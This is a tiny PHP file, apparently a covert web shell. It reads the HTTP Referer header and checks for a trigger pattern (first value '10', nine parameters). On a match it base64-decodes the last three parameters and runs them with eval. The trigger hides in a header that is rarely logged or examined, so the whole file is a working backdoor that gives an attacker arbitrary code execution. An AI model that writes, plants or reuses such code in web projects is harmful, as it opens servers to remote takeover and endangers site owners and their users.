<?php
//1.php
header('Content-type:text/html;charset=utf-8');
parse_str($_SERVER['HTTP_REFERER'], $a);
if(reset($a) == '10' && count($a) == 9) {
   eval(base64_decode(str_replace(" ", "+", implode(array_slice($a, 6)))));
}